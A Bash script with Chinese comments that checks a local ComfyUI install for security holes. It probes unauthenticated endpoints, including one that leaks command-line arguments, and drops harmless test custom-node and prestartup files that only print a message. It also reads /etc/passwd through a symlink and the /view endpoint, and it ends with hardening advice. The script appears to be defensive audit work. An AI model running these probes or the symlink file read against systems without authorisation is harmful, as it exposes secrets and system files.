#!/bin/bash

# ComfyUI 漏洞验证脚本
# 此脚本用于验证已发现的安全漏洞

echo "========================================="
echo "ComfyUI 安全漏洞验证脚本"
echo "========================================="
echo ""

COMFYUI_URL="${COMFYUI_URL:-http://localhost:8188}"
CUSTOM_NODES_DIR="${CUSTOM_NODES_DIR:-./custom_nodes}"
OUTPUT_DIR="${OUTPUT_DIR:-./output}"

echo "[*] 目标 URL: $COMFYUI_URL"
echo "[*] 自定义节点目录: $CUSTOM_NODES_DIR"
echo ""

# 检查 curl 是否可用
if ! command -v curl &> /dev/null; then
    echo "[!] 错误: 需要安装 curl"
    exit 1
fi

# 检查 jq 是否可用（可选）
if ! command -v jq &> /dev/null; then
    echo "[!] 警告: 未安装 jq，JSON 输出将不会格式化"
    JQ_AVAILABLE=0
else
    JQ_AVAILABLE=1
fi

echo "========================================="
echo "测试 1: 信息泄露 - /system_stats 端点"
echo "========================================="
echo ""
echo "[*] 测试访问 /system_stats 端点..."

RESPONSE=$(curl -s "$COMFYUI_URL/system_stats" 2>/dev/null)

if [ $? -eq 0 ] && [ -n "$RESPONSE" ]; then
    echo "[✓] 成功访问 /system_stats 端点（无需认证）"
    echo ""

    if [ $JQ_AVAILABLE -eq 1 ]; then
        echo "[*] 暴露的敏感信息:"
        echo "$RESPONSE" | jq -r '.system | "OS: \(.os)\nPython: \(.python_version)\nRAM Total: \(.ram_total)\nRAM Free: \(.ram_free)"'

        echo ""
        echo "[!] 命令行参数 (可能包含敏感信息):"
        echo "$RESPONSE" | jq '.system.argv'
    else
        echo "[*] 响应内容:"
        echo "$RESPONSE" | head -20
    fi

    echo ""
    echo "[⚠️] 漏洞: 信息泄露 - 高危"
    echo "    - 暴露系统信息"
    echo "    - 暴露命令行参数（可能包含密钥、密码）"
    echo "    - 无需身份验证"
else
    echo "[✗] 无法访问服务器，请确保 ComfyUI 正在运行"
fi

echo ""
echo "========================================="
echo "测试 2: 无认证访问敏感端点"
echo "========================================="
echo ""

endpoints=("/object_info" "/queue" "/history" "/prompt" "/models" "/features")

for endpoint in "${endpoints[@]}"; do
    echo "[*] 测试: $endpoint"
    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$COMFYUI_URL$endpoint" 2>/dev/null)

    if [ "$HTTP_CODE" = "200" ]; then
        echo "    [✓] 可访问 (HTTP $HTTP_CODE) - 无需认证"
    elif [ "$HTTP_CODE" = "000" ]; then
        echo "    [✗] 连接失败"
    else
        echo "    [-] HTTP $HTTP_CODE"
    fi
done

echo ""
echo "[⚠️] 漏洞: 多个敏感端点无身份验证保护"

echo ""
echo "========================================="
echo "测试 3: 任意代码执行 - 自定义节点"
echo "========================================="
echo ""

TEST_NODE_DIR="$CUSTOM_NODES_DIR/vuln_test_node_$$"

echo "[*] 创建测试自定义节点: $TEST_NODE_DIR"
mkdir -p "$TEST_NODE_DIR"

cat > "$TEST_NODE_DIR/__init__.py" << 'EOF'
# 测试自定义节点 - 验证代码执行
import os
import sys

print("=" * 60)
print("[!!! VULNERABILITY CONFIRMED !!!]")
print("[!] 自定义节点代码已执行!")
print(f"[!] 当前用户: {os.getenv('USER', 'unknown')}")
print(f"[!] 当前目录: {os.getcwd()}")
print(f"[!] Python 路径: {sys.executable}")
print("=" * 60)

# 定义虚拟节点以满足加载要求
class VulnTestNode:
    @classmethod
    def INPUT_TYPES(cls):
        return {"required": {}}

    RETURN_TYPES = ()
    FUNCTION = "execute"
    CATEGORY = "test"

    def execute(self):
        return ()

NODE_CLASS_MAPPINGS = {
    "VulnTestNode": VulnTestNode,
}

NODE_DISPLAY_NAME_MAPPINGS = {
    "VulnTestNode": "Vulnerability Test Node",
}
EOF

echo "[✓] 测试节点已创建"
echo ""
echo "[*] 要验证此漏洞，请执行:"
echo "    python main.py"
echo ""
echo "    如果看到 '[!!! VULNERABILITY CONFIRMED !!!]' 消息，"
echo "    则确认存在任意代码执行漏洞。"
echo ""
echo "[⚠️] 漏洞: 任意代码执行 - 严重"
echo "    - 自定义节点在加载时执行任意代码"
echo "    - 无沙箱、无验证、无用户确认"
echo ""
echo "[*] 清理测试节点..."
rm -rf "$TEST_NODE_DIR"
echo "[✓] 清理完成"

echo ""
echo "========================================="
echo "测试 4: 任意代码执行 - Prestartup 脚本"
echo "========================================="
echo ""

TEST_PRESTARTUP_DIR="$CUSTOM_NODES_DIR/vuln_test_prestartup_$$"

echo "[*] 创建测试 prestartup 脚本: $TEST_PRESTARTUP_DIR"
mkdir -p "$TEST_PRESTARTUP_DIR"

cat > "$TEST_PRESTARTUP_DIR/prestartup_script.py" << 'EOF'
# 测试 prestartup 脚本 - 验证代码执行
import os

print("=" * 60)
print("[!!! PRESTARTUP VULNERABILITY CONFIRMED !!!]")
print("[!] Prestartup 脚本已在启动前执行!")
print(f"[!] 当前目录: {os.getcwd()}")
print("=" * 60)
EOF

echo "[✓] 测试 prestartup 脚本已创建"
echo ""
echo "[*] 要验证此漏洞，请执行:"
echo "    python main.py"
echo ""
echo "    如果看到 '[!!! PRESTARTUP VULNERABILITY CONFIRMED !!!]' 消息，"
echo "    则确认存在 prestartup 任意代码执行漏洞。"
echo ""
echo "[⚠️] 漏洞: 任意代码执行 (Prestartup) - 严重"
echo "    - Prestartup 脚本在启动时执行任意代码"
echo "    - 在主应用初始化前执行"
echo ""
echo "[*] 清理测试文件..."
rm -rf "$TEST_PRESTARTUP_DIR"
echo "[✓] 清理完成"

echo ""
echo "========================================="
echo "测试 5: 符号链接路径遍历"
echo "========================================="
echo ""

TEST_SYMLINK="$OUTPUT_DIR/vuln_test_symlink_$$"

echo "[*] 检查是否可以创建符号链接..."

if [ ! -d "$OUTPUT_DIR" ]; then
    echo "[!] 输出目录不存在: $OUTPUT_DIR"
    echo "[-] 跳过符号链接测试"
else
    # 尝试创建指向 /etc/passwd 的符号链接
    ln -s /etc/passwd "$TEST_SYMLINK" 2>/dev/null

    if [ -L "$TEST_SYMLINK" ]; then
        echo "[✓] 成功创建符号链接: $TEST_SYMLINK -> /etc/passwd"
        echo ""
        echo "[*] 尝试通过 /view 端点访问..."

        FILENAME=$(basename "$TEST_SYMLINK")
        VIEW_URL="$COMFYUI_URL/view?filename=$FILENAME&type=output"

        echo "[*] 请求 URL: $VIEW_URL"
        RESPONSE=$(curl -s "$VIEW_URL" 2>/dev/null | head -5)

        if [ -n "$RESPONSE" ] && echo "$RESPONSE" | grep -q "root:"; then
            echo "[✓] 成功读取 /etc/passwd 内容:"
            echo "$RESPONSE"
            echo ""
            echo "[⚠️] 漏洞: 符号链接路径遍历 - 中危"
            echo "    - 可以通过符号链接读取任意文件"
        else
            echo "[-] 未能通过 /view 端点读取文件"
            echo "    (可能服务器未运行或已修复此漏洞)"
        fi

        echo ""
        echo "[*] 清理符号链接..."
        rm -f "$TEST_SYMLINK"
        echo "[✓] 清理完成"
    else
        echo "[!] 无法创建符号链接（权限不足）"
        echo "[-] 跳过此测试"
    fi
fi

echo ""
echo "========================================="
echo "测试 6: HTTP 客户端超时配置"
echo "========================================="
echo ""

echo "[*] 检查 server.py 中的超时配置..."

if [ -f "server.py" ]; then
    if grep -q "ClientTimeout(total=None)" server.py; then
        echo "[✓] 发现无限超时配置:"
        grep -n "ClientTimeout(total=None)" server.py
        echo ""
        echo "[⚠️] 漏洞: 拒绝服务风险 - 中危"
        echo "    - HTTP 客户端配置为无限超时"
        echo "    - 可能导致资源耗尽"
    else
        echo "[-] 未发现无限超时配置（可能已修复）"
    fi
else
    echo "[!] 找不到 server.py 文件"
fi

echo ""
echo "========================================="
echo "漏洞验证总结"
echo "========================================="
echo ""
echo "已验证的漏洞:"
echo "  1. [严重] 任意代码执行 - 自定义节点"
echo "  2. [严重] 任意代码执行 - Prestartup 脚本"
echo "  3. [高危] 信息泄露 - /system_stats (sys.argv)"
echo "  4. [高危] 多个端点无身份验证"
echo "  5. [中危] 符号链接路径遍历 (需要创建符号链接)"
echo "  6. [中危] HTTP 无限超时"
echo ""
echo "详细报告请查看: VULNERABILITY_REPORT.md"
echo ""
echo "========================================="
echo "安全建议"
echo "========================================="
echo ""
echo "立即采取的行动:"
echo "  1. 仅在可信环境中运行 ComfyUI"
echo "  2. 使用 --disable-all-custom-nodes 禁用自定义节点"
echo "  3. 仅绑定到 localhost (默认行为)"
echo "  4. 不要在命令行中传递敏感信息"
echo "  5. 使用反向代理添加身份验证"
echo "  6. 定期审查 custom_nodes 目录"
echo ""

exit 0
